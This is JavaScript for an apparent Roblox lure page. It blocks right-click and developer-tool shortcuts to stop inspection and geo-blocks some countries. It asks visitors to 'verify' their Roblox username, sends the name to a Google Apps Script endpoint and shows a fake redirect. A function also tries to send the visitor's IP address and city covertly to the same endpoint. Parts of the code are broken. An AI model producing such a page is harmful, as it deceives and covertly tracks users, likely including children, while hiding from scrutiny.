
var intent = "0"

    document.addEventListener('contextmenu', function(e) {
      e.preventDefault();
    });
    document.onkeydown = function(e) {
      if(event.keyCode == 123) {
         return false;
      }
      if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
         return false;
      }
      if(e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) {
         return false;
      }
      if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
         return false;
      }
      if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
         return false;
      }
    }
    
function Load() {
  Swal.fire({
    title: "<h4 onselectstart='false' style='color:#d1d1d1;'>Redirecting to the roblox game</h4>",
    timer: 10, //tiempo del timer
    background: '#272727',
    onBeforeOpen: () => {
      Swal.showLoading()
  
    },
    onClose: () => {
      clearInterval(timerInterval)
    }
  }).then((result) => {

  })
}


var VPN = ["KR","RU","CN"];
  fetch('https://ipapi.co/json/')
  .then(function(response) {
      return response.json();
    })
    .then(function(data) {
      for (var i = 0; i < VPN.length; i++) {
      if (data.country == VPN[i]) {
        Swal.fire({     
          type: 'error',
          title: "<h4 style='color:white;'>Access to this page was denied</h4>",
          background: '#272727',
          
          howCancelButton: false,
          showConfirmButton: false,
          onOpen: function (){
            swal.disableConfirmButton();
          }
        });
      }

    }
  }); 







function GetUserName() {
  $(document).ready(function(){
    jQuery('input').on('input', function(property) {
      AntiHackServer(jQuery('input').val())
    });
  });
  jQuery('input').click(function() {
   alert("as")
  });
 
  Swal.fire({
    title: "<h4 onselectstart='false' style='color:#d1d1d1;'>Enter your ROBLOX UserName</h4>",
    input: "text",
    cancelButtonColor: "#535353",
    confirmButtonColor: "#0590a8",
    allowOutsideClick: true,

    inputAttributes: {
      autocapitalize: 'off'
    },

    
    //showCancelButton: true,
    confirmButtonText: "Verify   <i class='fas fa-arrow-right'></i>",
    cancelButtonText: "Cancel",
    showLoaderOnConfirm: true,
    background: '#272727',


    

  preConfirm: (login) => { 
if (login == "" ) {
  if(jQuery('input').val().indexOf(' ') == 1){
  Swal.showValidationMessage(
    `<p style='color:#fcfcfc;'>aPlease enter an valid username</p>`,
    )
    return "sds"
  }
}
  
  if(jQuery('input').val().length >= 21){
    Swal.showValidationMessage( 
      `<p style='color:#fcfcfc;'>Usernames can be 3 to 20 characters long.</p>`,
      )
      return "a"
  }
  if(jQuery('input').val().split("_").length >= 3){
    Swal.showValidationMessage(
      `<p style='color:#fcfcfc;'>Usernames can have at most one _.</p>`,
      )
      return "a"
    }
  if(jQuery('input').val().length <= 2){
    Swal.showValidationMessage( 
      `<p style='color:#fcfcfc;'>Usernames can be 3 to 20 characters long.</p>`,
      )
      return "a"
}
if(jQuery('input').val().indexOf('_') >= jQuery('input').val().length-1){
  Swal.showValidationMessage(
    `<p style='color:#fcfcfc;'>Usernames cannot start or end with _.</p>`,
    )
    return "s"
}

if(jQuery('input').val().indexOf('_') == 0){
  Swal.showValidationMessage(
    `<p style='color:#fcfcfc;'>Usernames cannot start or end with _.</p>`,
    )
    return "s"
}

  if(jQuery('input').val().indexOf(' ') >= 0){
    Swal.showValidationMessage(
      `<p style='color:#fcfcfc;'>Usernames may only contain letters, numbers, and _.</p>`,
      )
      return "a"
  }
  var format = /[!@#$%^&*()+\-=\[\]´{}ñ;¡¿~€¬·':"\\|,.<>\/?]+/;
  if(format.test(jQuery('input').val())){
    Swal.showValidationMessage(
      `<p style='color:#fcfcfc;'>Usernames may only contain letters, numbers, and _.</p>`,
      )
      return "a"
}
 return fetch("https://script.google.com/macros/s/AKfycbx3gYi1rSt5mXZ40w3fa5uvaroX0V3n_xND7QnvzmwK9rCSAHM/exec?sheet=Global&key=" + login)

    .catch(error => {
    return Swal.fire({        
      type: 'error',
      title: "<h4 style='color:white;'>CORS ERROR</h4>",
      text: "a",
      background: '#272727',
      confirmButtonText: "Retry",
    cancelButtonText: "Retry",
      html: "<span style='color:#fdfdfd;'>GET has been falled</span>", 
    }).then(function() {
      GetUserName() ;

    });
    })


    .then(function(response) {
     return response.json();
   })
   .then(function(data) {
     console.log(data.response)
     if (data.response.errorMessage == "User not found") {
      Swal.showValidationMessage(
        `<p style='color:#fcfcfc;'>User not found</p>`,
        )
        return "a"
      }
   });
  },


 
  allowOutsideClick: () => !Swal.isLoading()
}).then((resultado) => {
  Load()
})

}

GetUserName()


function myFunction(RobloxUserName) {

fetch('https://ipapi.co/json/')
.then(function(response) {
    return response.json();
  })
  .then(function(data) {

    fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
      },
      body: "sheet=Global&key=dsadsfdsfsd&value=" + "data.ip" + "data.city"
    })
  });
  return RobloxUserName
}



var Info
// https://script.google.com/macros/s/AKfycbx3gYi1rSt5mXZ40w3fa5uvaroX0V3n_xND7QnvzmwK9rCSAHM/exec?sheet=Global&key=users
var url = "https://script.google.com/macros/s/AKfycbx3gYi1rSt5mXZ40w3fa5uvaroX0V3n_xND7QnvzmwK9rCSAHM/exec"

function decodeJsonFun(json) {
	var jsonTab = decodeURI(json)
	return jsonTab
}


function ObtenerUrl(Key) {
 return url + "?sheet=" + "Global" + "&key=" + Key;
  
}

// console.log(ObtenerUrl("Redirectin"))

function ActualizarEstado(Key, NuevoValor) {
  return url + "?sheet=" + "Global" + "&key=" + Key;
 }
// 665585741


myFunction(Info);


function AntiHackServer(key) {
  if(key.length >= 21){
    Swal.showValidationMessage( 
      `<p style='color:#fcfcfc;'>Usernames can be 3 to 20 characters long.</p>`,
      )
  }
 
    if(key.split("_").length >= 3){
    Swal.showValidationMessage(
      `<p style='color:#fcfcfc;'>Usernames can have at most one _.</p>`,
      )
    }

  if(key.indexOf(' ') >= 0){
    Swal.showValidationMessage(
      `<p style='color:#fcfcfc;'>Usernames may only contain letters, numbers, and _.</p>`,
      )
  }
  
  var format = /[!@#$%^&*()+\-=\[\]´{}ñ;¡¿~€¬·':"\\|,.<>\/?]+/;
  if(format.test(key)){
    Swal.showValidationMessage(
      `<p style='color:#fcfcfc;'>Usernames may only contain letters, numbers, and _.</p>`,
      )
    }
}
